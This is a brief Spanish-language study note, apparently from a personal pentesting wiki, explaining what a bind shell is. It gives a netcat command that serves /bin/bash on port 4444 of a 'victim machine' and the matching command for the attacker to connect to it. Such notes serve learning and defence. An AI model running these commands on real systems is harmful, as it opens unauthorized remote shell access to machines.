Cuando decimos que se establece una _bind shell_ significa que logramos **abrir** un puerto en la maquina victima y ofrecer una consola interactiva (que puede ser con [[netcat]] por ejemplo). Y nos conectamos nosotros a la maquina victima, no la maquina victima a nosotros.

----------------

Este es un ejemplo de un comando que deberiamos ejecutar en la maquina victima:

```bash
nc -lnvp 4444 -e /bin/bash
```

y nosotros ejecutamos el siguiente comando:

```bash
nc 192.168.123.123 4444
```


